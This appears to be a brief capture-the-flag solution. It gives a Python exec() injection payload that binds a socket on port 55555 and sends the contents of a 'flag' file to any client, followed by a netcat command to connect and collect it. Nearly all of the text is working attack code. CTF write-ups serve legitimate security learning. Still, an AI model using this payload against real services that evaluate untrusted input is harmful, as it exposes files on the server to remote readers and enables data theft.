#Solution

exec('import socket; s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1); s.bind(("0.0.0.0", 55555)); s.listen(1); c = s.accept()[0]; c.send(open("flag", "rb").read())')

then connect to server via netcat: "nc host 55555". It will send us a flag.